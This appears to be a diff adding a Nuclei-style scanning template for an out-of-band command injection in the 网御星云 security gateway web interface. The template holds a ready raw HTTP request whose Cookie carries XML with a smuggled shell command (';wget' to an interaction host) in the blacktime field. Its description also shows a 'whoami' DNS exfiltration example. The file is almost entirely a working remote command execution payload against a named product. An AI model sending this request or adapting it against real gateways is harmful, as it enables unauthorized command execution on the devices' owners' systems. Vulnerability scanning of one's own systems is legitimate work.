@@ -1,0 +1,28 @@
+id: nsfocus-gateway-xml-injection-oob-rce
+
+info:
+  name: 网御星云安全网关系统 XML参数注入触发OOB命令执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞通过XML参数注入机制在网御星云安全网关系统中实现带外命令执行。攻击者可构造恶意请求触发任意系统命令执行，并利用DNS协议外带验证结果。验证请求示例：http://$(whoami).{Dnslog}$
+  tags: 网御星云安全网关系统
+
+http:
+  - raw:
+    - |
+      GET /cgi-bin/webui/?op=linkage_proc HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Accept: */*
+      Accept-Encoding: gzip, deflate
+      Cookie: <?xml version="1.0"?><data ip="123"><blacklist><af>ipv4</af><saddr>1.1.1.1</saddr><daddr>2.2.2.2</daddr><blacktime>%3bwget%20http://{{interactsh-url}}%3b</blacktime></blacklist></data>
+    matchers-condition: and
+    matchers:
+    - type: status
+      status:
+      - 200
+    - type: word
+      part: interactsh_protocol
+      words:
+      - "dns"
